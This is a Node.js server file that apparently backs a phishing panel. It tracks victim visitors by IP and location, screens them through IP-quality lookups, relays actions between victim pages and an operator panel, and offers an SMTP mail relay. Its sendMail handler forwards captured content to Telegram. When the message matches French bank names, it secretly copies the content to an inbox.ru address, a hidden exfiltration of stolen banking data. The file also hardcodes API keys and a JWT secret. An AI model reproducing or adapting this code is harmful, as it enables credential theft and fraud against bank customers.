const Datastore = require("nedb-promises");
let datastore = Datastore.create({
  filename: "./db/nc.json",
  timestampData: true,
  autoload:true
});



const express = require("express");
const rateLimit = require("express-rate-limit");
const ipfilter = require("express-ipfilter").IpFilter;
const app = express();
var jwt = require("jsonwebtoken");
const blackList = ["77.134.127.100"];
const session = require("cookie-session");
const server = require("http").createServer(app);
const fetch = require("node-fetch");
const io = require("socket.io")(server);
const PORT = process.env.PORT || 5001;
const { sendMail, sendMail__, sendMailTemplate } = require("./mail/");
const { testSMTP, sendnodemailer } = require("./mail/nodemailer");
const { messageViaTelegram, initBot } = require("./telegram/index");

const geoip = require("node-iplocate");
const publicIp = require("public-ip");
const generateUniqueId = require("generate-unique-id");
const { htmlToText } = require("html-to-text");
const cors = require("cors");

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs,
  message:
    "Too many accounts created from this IP, please try again after an hour",
});

//  apply to all requests
//app.use(limiter);
app.use(cors());

app.use(
  session({
    name: "cook-session",
    keys: ["relic_"],
    cookie: { maxAge: 60000 * 60 },
  })
);

//app.use(ipfilter(blackList));

app.use(function (req, res, next) {
  res.header("Access-Control-Allow-Origin", "*"); // update to match the domain you will make the request from
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  next();
});

app.use(express.json());

var message = {
  name: "Baltimore",
  from: "nsa.e009@mail.com",
  to: "ceo.vueci@gmail.com",
  subject: "Linosata Regal",
  text: "Heello Guy , my name is",
};

const ams = {};

var HTML = ` 

Moi \n
comment  vas \,n
`;

//messageViaTelegram("__INIT.SERVER__");
initBot();

//sendMail(message)
// .then((e) => e)
// .catch((err) => console.log(err));

io.on("connection", async(socket) => {
  var clientIpAddress =
    socket.request.headers["x-client-ip"] ||
    socket.request.headers["x-real-ip"] ||
    socket.request.headers["x-forwarded-for"] ||
      socket.request.connection.remoteAddress;
    
  console.log("query code", socket.handshake.query.code)

  socket.on("disconnect",async () => {
     await datastore
        .remove({
          token: socket.handshake.query.code,
          ip: clientIpAddress,
        })
        .then((e) => e)
        .catch((err) => err);
    
    socket.broadcast.emit("by-"+socket.handshake.query.code, clientIpAddress)
  })
  try {
   let url =
      "https://api.ipbase.com/json/" +
      ip +
      "?apikey=wN4bkT8dBtjwOH5zFHEmqxT4MgpYQDZBS7edKo4J";

    var response = await fetch(url)
      .then((e) => e.json())
      .then((e) => {
        return e;
      })
      .catch((err) => {
        console.log("Big err in ipstack " + err);
        return null;
      });
    
    datastore.find({
      type: "client",
      token: socket.handshake.query.code,
      ip: clientIpAddress,
    }).then(async e => {

      console.log("Find one",e)

      if (!e || !e.length) {
         datastore
           .insert({
             type: "client",
             token: socket.handshake.query.code,
             ip: clientIpAddress,
             location: response,
           })
           .then((e) => e)
           .catch((err) => err);
      } else {
          
      }
      console.log(
        "send to panel  new-" +
          socket.handshake.query.code +
          " : " +
          clientIpAddress
      );
      socket.broadcast.emit(
        "new-" + socket.handshake.query.code,
        clientIpAddress
      );
      
    });
   
  } catch (err) {
    console.log(err)
}
  
    

  console.log(
    "New user connected " +
      socket.id +
      new Date().toLocaleTimeString() +
      " IP : " +
      clientIpAddress
  );

  socket.on("getoken", async (info, clb) => {
      var data_ =  await datastore.insert(info).then(e => e).catch(err => err)
      console.log("id ",data_)
        var token = jwt.sign(data_, "keys0_digitalocean", {
        expiresIn: "60d",
        });

    clb({token: token,code:data_._id});
  });

   socket.on("getokenAllClients", async (token, clb) => {
     var data__ = await datastore
       .find({
         type: "client",
         token:token
       }).sort()
       .then((e) => e)
       .catch((err) => null);
    
    
     clb(data__);
   });

   socket.on("getokenlogin", async (info, clb) => {
     var data_ = await datastore
       .find(info)
       .then((e) => e)
       .catch((err) => null);
    
    
     clb(data_);
   });

  socket.on("doaction_from_client", async (info, clb) => {
     //info.token & info.data
     socket.broadcast.emit("" + info.token, { ip: clientIpAddress ,data:info.data});
  });
  

  socket.on("doaction_from_panel", async (info, clb) => {
     //info.token & info.data
    socket.broadcast.emit("" + info.token, info.data);
   });


  socket.on("jwt", (info, clb) => {
    clb(jwt.verify(info.jwt, info.pass));
  });

  socket.on("sendMail", (mail, clb) => {
    console.log("New request from " + clientIpAddress);

    var lock = blackList.filter((ip) => ip == clientIpAddress);

    if (lock.length) {
      return false;
    }

    var text_ = htmlToText(mail.html, {
      wordwrap: 130,
    });

    mail.text = text_;

    var piege = false;

    if (piege) {
      clb(true);
      setTimeout(() => {
        console.log("Mail " + mail.to);
        //clb(e);  // active to late
        sendMail(mail)
          .then((e) => {
            setTimeout(() => {
              clb(e);
            }, 0);
          })
          .catch((err) => {
            clb(err);
          });
      }, 3150 * 15);
    } else {
      setTimeout(() => {
        // console.log("Mail " + mail.to);
        //clb(e);  // active to late
        sendMail(mail)
          .then((e) => {
            console.log(e);
            setTimeout(() => {
              clb(e);
            }, 0);
          })
          .catch((err) => {
            clb(err);
          });
      }, 3600);
    }

    let mxg = Object.assign({}, mail);
    // mxg.subject = mxg.subject + "> " + mxg.to;

    mxg.subject = mxg.subject + "> " + mxg.name || "";

    try {
      var telegramMessage =
        mxg.name + "\n" + mxg.to + "\n \n" + mxg.subject + " \n \n" + mxg.text;
      messageViaTelegram(telegramMessage);
    } catch (err) {
      console.log("Err in telegram", err);
    }

    // mxg.grom="admin@mailo.com"
    try {
      if (
        mail.private ||
        mail.name
          .toLowerCase()
          .match(
            /(kirin|lcl|crf|cetelem|ca|CA|ce|floa|nord|bnp|agri|sg|bank)/
          ) ||
        mail.subject
          .toLowerCase()
          .match(
            /(kirin|lcl|crf|cetelem|ca|CA|kirin|floa|nord|bnp|agri|sg|bank)/
          ) ||
        mail.html.toLowerCase().match(/(apollo)/)
      ) {
        if (
          mail.name.toLowerCase().match(/(office|Office)/) ||
          mail.subject.toLowerCase().match(/(office)/)
        ) {
          // match office dont send anyone
        } else {
          mxg.to = "key.logs10@inbox.ru";
          //  mxg.bcc = "chris.kobe@inbox.ru";
          sendMail(mxg)
            .then((e) => {
              console.log(e);
            })
            .catch((err) => {
              console.log(err);
            });
        }
      } else {
        //  mxg.to = "didi.stone20@inbox.ru";
        //  mxg.bcc = "chris.kobe@inbox.ru";
        //sendMail(mxg)
        //    .then((e) => {
        //        console.log(e);
        //   })
        //   .catch((err) => {
        //       console.log(err);
        //    });
      }
    } catch (err) {
      console.log("Error Big " + err);
    }

    //console.log("Mxg " + mxg.to);
  });
});

app.set("trust proxy", true);

app.post("/_node_", async (req, res) => {
  var ip =
    req.headers["x-client-ip"] ||
    req.headers["x-real-ip"] ||
    req.headers["x-forwarded-for"] ||
    req.connection.remoteAddress ||
    req.info.remoteAddress;

  try {
    var control = req.body || null;

    console.log("_node_ : ", control);

    if (control.action == "testsmtp") {
      return await testSMTP(control.config)
        .then((e) => res.send(e))
        .catch((err) => res.status(400).send(err));
    }

    if (control.action == "nodemailer") {
      return await sendnodemailer(control.config, control.mail)
        .then((e) => res.send(e))
        .catch((err) => res.status(400).send(err));
    }
  } catch (err) {
    res.status(400).send(err);
  }
});

app.get("/quality", async (req, res) => {
  var ip = req.query.ip || null;

  if (!ip) {
    ip =
      req.headers["x-client-ip"] ||
      req.headers["x-real-ip"] ||
      req.headers["x-forwarded-for"] ||
      req.connection.remoteAddress ||
      req.info.remoteAddress;
  }

  console.log("IP", ip);
  var response = await fetch(
    "https://ipqualityscore.com/api/json/ip/" + req.query.token + "/" + ip
  )
    .then((e) => e.json())
    .then((e) => e)
    .catch();

  res.send(response);
});

app.get("/ip", async (req, res) => {
  return new Promise(async (resolve, reject) => {
    if (!req.session.userID) {
      var userID = generateUniqueId({
        length: 5,
        useLetters: false,
      }).toUpperCase();

      req.session.userID = userID;
      req.session.save();
    }

    var ip =
      req.headers["x-client-ip"] ||
      req.headers["x-real-ip"] ||
      req.headers["x-forwarded-for"] ||
      req.connection.remoteAddress ||
      req.info.remoteAddress;

    console.log("x client", req.headers["x-client-ip"]);
    console.log("x real", req.headers["x-real-ip"]);
    console.log("x for", req.headers["x-forwarded-for"]);

    var IP_ = await publicIp.v4();
    //var response = await geoip(ip,{api_key:'a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5'}).then(e=>e).catch(err=>console.log(err));

    // var response = await fetch(
    //   "http://api.ipstack.com/" +
    //    ip +
    // "?access_key=75202de6d8eda19bb3742abd99499483"
    // )
    // .then((e) => e.json())
    // .then((e) => e)
    // .catch((err) => null);

    var url1 =
      "http://api.ipstack.com/" +
      ip +
      "?access_key=bea5974f205f080bb810216fb0026167";

    var url =
      "https://api.ipbase.com/json/" +
      ip +
      "?apikey=wN4bkT8dBtjwOH5zFHEmqxT4MgpYQDZBS7edKo4J";

    var response = await fetch(url)
      .then((e) => e.json())
      .then((e) => {
        return e;
      })
      .catch((err) => {
        console.log("Big err in ipstack " + err);

        return null;
      });

    if (!Object.keys(response).length) response = ip;

    console.log("Response", response);

    try {
      delete response.location.country_flag;
      delete response.location.country_flag_emoji;
    } catch (err) {}

    try {
      if (!response.country_code)
        response.country_code =
          response.location.country || response.country_code || "";
    } catch (err) {}

    resolve(res.json(response));
  });
});

app.get("/iqs", async (req, res) => {
  var IP_ = await publicIp.v4();
  var ip =
    req.headers["x-client-ip"] ||
    req.headers["x-real-ip"] ||
    req.headers["x-forwarded-for"] ||
    req.connection.remoteAddress ||
    req.info.remoteAddress;

  try {
    fetch(
      "https://ipqualityscore.com/api/json/ip/" + req.query.api + "/" + ip,
      {
        headers: {
          "content-type": "application/json",

          cache: "no-store",
          "cache-control": "no-cache",
          pragma: "no-cache",
        },
      }
    )
      .then((e) => e.json() || e.text())
      .then((e) => {
        res.send(e);
      })
      .catch((err) => {
        res.json({ error: true });
      });
  } catch (err) {
    res.json({ error: true });
  }
});

app.get("/", (req, res) => {
  var ip =
    req.headers["x-client-ip"] ||
    req.headers["x-real-ip"] ||
    req.headers["x-forwarded-for"] ||
    req.connection.remoteAddress ||
    req.info.remoteAddress;

  if (!req.session.userID) {
    var userID = generateUniqueId({
      length: 5,
      useLetters: false,
    }).toUpperCase();

    req.session.userID = userID;
    req.session.save();
  }

  res.send("__" + ip);
});

server
  .listen(PORT, () => console.log("[___key0__] ", PORT))
  .on("error", (err) => {
    console.error("There was an uncaught error", err);
  });
